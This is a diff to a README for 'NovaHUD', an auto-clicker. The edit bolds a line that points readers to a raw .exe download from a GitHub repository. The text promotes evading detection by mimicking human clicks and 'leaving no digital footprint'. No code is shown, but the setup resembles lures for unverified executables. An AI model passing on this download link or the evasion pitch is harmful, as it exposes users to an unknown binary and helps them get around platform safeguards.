@@ -1,7 +1,7 @@
 # 🖱️ NovaHUD // Obsidian Protocol v1.2
 NovaHUD is a high-precision automation tool designed for raw performance and total discretion. Developed under the Obsidian Protocol, it features an advanced randomization engine to simulate authentic human interaction, ensuring maximum efficiency without leaving a digital footprint.
 
-To download use "https://github.com/anybooot/AutoClicker/raw/main/NovaHUD.exe"
+**To download use** "https://github.com/anybooot/AutoClicker/raw/main/NovaHUD.exe"
 
 # ⚡ Core Features
 **Smart Click AI:** An advanced algorithmic engine that avoids repetitive patterns by introducing micro-variations in click intervals, perfectly mimicking human behavior.
